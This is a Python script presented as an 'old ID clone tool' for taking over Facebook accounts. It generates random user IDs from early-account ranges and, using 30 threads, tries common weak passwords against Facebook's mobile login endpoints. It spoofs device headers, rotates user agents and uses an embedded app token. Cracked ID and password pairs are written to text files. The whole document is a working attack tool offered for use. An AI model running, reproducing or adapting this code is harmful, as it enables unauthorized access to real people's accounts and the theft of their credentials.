import os
import re
import time
import uuid
import random
import requests
import sys
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred

# Global variables
oks = []
loop = 0

# Color codes
rad = '\x1b[38;5;196m'
G   = '\x1b[38;5;46m'
Y   = '\x1b[38;5;220m'
W   = '\x1b[1;37m'


def mobile_agent():
    chrome_ver = random.choice(range(120, 140))
    build = rr(5000, 9000)
    patch = rr(50, 250)
    android_ver = random.choice(['12', '13', '14'])
    model = random.choice([
        'SM-G991B', 'SM-A536B', 'Pixel 8', 'Pixel 8 Pro',
        'Redmi Note 13 Pro', 'OnePlus 12', 'POCO F5', 'Xiaomi 14',
        'SM-S908B', 'SM-A346B', 'Pixel 7a', 'OnePlus Nord 3'
    ])
    agents = [
        f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/SKQ1.211019.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build}.{patch} Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.39.109;]",
        f"Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build}.{patch} Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android {android_ver}; {model} Build/TQ3A.230901.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{build}.{patch} Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_{rr(0,4)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(agents)


def creationyear(uid):
    uid = str(uid)
    if len(uid) <= 3:
        return '2004'
    elif len(uid) in (4, 5):
        return '2004-2005'
    elif len(uid) == 6:
        return '2005'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) in (9, 10):
        return '2008'
    else:
        return 'OLD'


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def banner():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print("""\033[1;32m
░░░░░██╗░█████╗░██╗░░░██╗  ██████╗
░░░░░██║██╔══██╗╚██╗░██╔╝  ╚════██╗
░░░░░██║██║░░██║░╚████╔╝░   █████╔╝
██╗░░██║██║░░██║░░╚██╔╝░░  ██╔═══╝░
╚█████╔╝╚█████╔╝░░░██║░░░  ███████╗
░╚════╝░░╚════╝░░░░╚═╝░░░  ╚══════╝
\033[0m""")
    print(f"       {W}[ {G}2004-2008 VERY OLD ID CLONE TOOL{W} ]")
    linex()


def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(
            f"\r {W}[{rad}M1{W}] LOOP:{G}{loop}{W} | OK:{G}{len(oks)}{W} | TRYING: {Y}{uid}{W}  "
        )
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', '000000', '111111'):
            ua = mobile_agent()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com',
                'X-FB-Net-HNI': str(rr(20000, 40000)),
                'X-FB-SIM-HNI': str(rr(20000, 40000)),
                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'MOBILE.5G', 'WIFI']),
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': f"nid={uuid.uuid4().hex[:16]};pid=Main;tid={rr(100,999)};",
                'x-fb-device-group': str(rr(4096, 6144)),
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': uuid.uuid4().hex,
                'x-fb-connection-bandwidth': str(rr(20000000, 50000000)),
                'x-fb-connection-quality': random.choice(['EXCELLENT', 'GOOD']),
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers,
                allow_redirects=False, timeout=15
            ).json()
            if 'session_key' in res:
                print(f"\n {W}[{G}HIT{W}] {G}{uid}{W} | {Y}{pw}{W} | YEAR: {G}{creationyear(uid)}")
                open('JOY2-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\n {W}[{G}HIT{W}] {G}{uid}{W} | {Y}{pw}{W} | YEAR: {G}{creationyear(uid)}")
                open('JOY2-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(3)


def login_2(uid):
    global loop
    sys.stdout.write(
        f"\r {W}[{rad}M2{W}] LOOP:{G}{loop}{W} | OK:{G}{len(oks)}{W} | TRYING: {Y}{uid}{W}  "
    )
    sys.stdout.flush()
    for pw in ('123456', '123123', '1234567', '12345678', '123456789', '000000', '111111'):
        try:
            with requests.Session() as session:
                ua = mobile_agent()
                headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'x-fb-connection-bandwidth': str(rr(20000000, 50000000)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': random.choice(['EXCELLENT', 'GOOD']),
                    'x-fb-connection-type': random.choice([
                        'cell.CTRadioAccessTechnologyLTE',
                        'cell.CTRadioAccessTechnologyNRNSA',
                        'WIFI',
                    ]),
                    'x-fb-http-engine': 'Liger',
                    'x-fb-device-group': str(rr(4096, 6144)),
                    'x-fb-session-id': f"nid={uuid.uuid4().hex[:16]};pid=Main;tid={rr(100,999)};",
                    'x-fb-connection-token': uuid.uuid4().hex,
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                }
                url = (
                    f"https://b-api.facebook.com/method/auth.login"
                    f"?format=json&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1"
                    f"&error_detail_type=button_with_disabled"
                    f"&source=device_based_login"
                    f"&meta_inf_fbmeta=%20&currently_logged_in_userid=0"
                    f"&method=GET&locale=en_US&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.account.login.protocol.Fb4aAuthHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                po = session.get(url, headers=headers, timeout=15).json()
                if 'session_key' in str(po):
                    print(f"\n {W}[{G}HIT{W}] {G}{uid}{W} | {Y}{pw}{W} | YEAR: {G}{creationyear(uid)}")
                    open('JOY2-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1


def main():
    user = []
    banner()
    print(f"       {W}({rad}1{W}) {G}2004  {W}→ ID range: {Y}1 – 9999")
    linex()
    print(f"       {W}({rad}2{W}) {G}2005  {W}→ ID range: {Y}10000 – 999999")
    linex()
    print(f"       {W}({rad}3{W}) {G}2006  {W}→ ID range: {Y}1000000 – 9999999")
    linex()
    print(f"       {W}({rad}4{W}) {G}2007  {W}→ ID range: {Y}10000000 – 99999999")
    linex()
    print(f"       {W}({rad}5{W}) {G}2008  {W}→ ID range: {Y}100000000 – 999999999")
    linex()
    print(f"       {W}({rad}A{W}) {G}ALL   {W}→ {Y}2004-2008 MIX RANGE")
    linex()

    year_sel = input(f"       {W}[{rad}★{W}] SELECT YEAR {W}: {Y}").strip().upper()

    year_ranges = {
        '1': (1, 9999),
        '2': (10000, 999999),
        '3': (1000000, 9999999),
        '4': (10000000, 99999999),
        '5': (100000000, 999999999),
    }

    banner()
    limit = input(f"       {W}[{rad}★{W}] TOTAL ID COUNT (ex: 5000) {W}: {Y}").strip()
    linex()

    try:
        limit_int = int(limit)
    except ValueError:
        print(f"    {rad}Invalid number. Exiting.")
        time.sleep(2)
        return

    if year_sel == 'A':
        all_ranges = list(year_ranges.values())
        for _ in range(limit_int):
            lo, hi = random.choice(all_ranges)
            user.append(str(rr(lo, hi)))
    elif year_sel in year_ranges:
        lo, hi = year_ranges[year_sel]
        for _ in range(limit_int):
            user.append(str(rr(lo, hi)))
    else:
        print(f"\n    {rad}Invalid selection.")
        time.sleep(2)
        return

    print(f"       {W}({rad}A{W}) {G}METHOD A")
    linex()
    print(f"       {W}({rad}B{W}) {G}METHOD B")
    linex()
    meth = input(f"       {W}[{rad}★{W}] CHOICE {W}(A/B): {Y}").strip().upper()

    with tred(max_workers=30) as pool:
        banner()
        print(f"       {W}[{rad}★{W}] TOTAL IDS  {W}: {G}{limit_int}")
        print(f"       {W}[{rad}★{W}] SERIES     {W}: {G}2004-2008 VERY OLD")
        print(f"       {W}[{rad}★{W}] METHOD     {W}: {G}{meth}")
        print(f"       {W}[{rad}★{W}] OUTPUT     {W}: {Y}JOY2-OLD-M{'1' if meth=='A' else '2'}-OK.txt")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break
        print(f"\n\n       {W}[{G}DONE{W}] Total OK: {G}{len(oks)}")
        linex()


if __name__ == '__main__':
    main()
